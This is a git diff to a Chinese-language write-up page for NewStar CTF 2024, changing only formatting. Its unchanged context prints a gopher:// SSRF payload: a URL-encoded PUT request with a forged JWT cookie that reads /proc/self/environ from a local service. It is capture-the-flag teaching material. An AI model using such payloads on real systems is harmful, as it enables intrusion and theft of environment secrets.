@@ -1,6 +1,7 @@
 ---
-titleTemplate: ':title | WriteUp - NewStar CTF 2024'
+titleTemplate: ":title | WriteUp - NewStar CTF 2024"
 ---
+
 <script setup>
 import Container from '@/components/docs/Container.vue'
 </script>
@@ -186,7 +187,7 @@ Content-Length: 18
 必须填正确 `Content-Length` 的值，以使报文接收方正确解析 HTTP Body 的内容，并且 Body 不应当包含换行符，否则读文件会失败。
 :::
 
-对请求进行编码和套上 Gopher 协议（[CyberChef Recipe](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'gopher://localhost:8000/_',true,false,true,false)&input=UFVUIC9mYXZvcml0ZSBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjgwMDANCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbg0KQ29va2llOiB0b2tlbj1leUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKMWMyVnlJam9pVUdGd1lTSjkudGdBRW5XWkpHVGExX0hJQmxVUWo4bnpSczJNOWFzb1daLUpZQVF1VjBOMA0KQ29udGVudC1MZW5ndGg6IDE4DQoNCi9wcm9jL3NlbGYvZW52aXJvbg&ieol=CRLF&oeol=CRLF)）：
+对请求进行编码和套上 Gopher 协议（[CyberChef Recipe](<https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'gopher://localhost:8000/_',true,false,true,false)&input=UFVUIC9mYXZvcml0ZSBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjgwMDANCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbg0KQ29va2llOiB0b2tlbj1leUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKMWMyVnlJam9pVUdGd1lTSjkudGdBRW5XWkpHVGExX0hJQmxVUWo4bnpSczJNOWFzb1daLUpZQVF1VjBOMA0KQ29udGVudC1MZW5ndGg6IDE4DQoNCi9wcm9jL3NlbGYvZW52aXJvbg&ieol=CRLF&oeol=CRLF>)）：
 
 ```plaintext
 gopher://localhost:8000/_PUT%20%2Ffavorite%20HTTP%2F1%2E1%0D%0AHost%3A%20localhost%3A8000%0D%0AContent%2DType%3A%20text%2Fplain%0D%0ACookie%3A%20token%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9%2EeyJ1c2VyIjoiUGFwYSJ9%2EtgAEnWZJGTa1%5FHIBlUQj8nzRs2M9asoWZ%2DJYAQuV0N0%0D%0AContent%2DLength%3A%2018%0D%0A%0D%0A%2Fproc%2Fself%2Fenviron
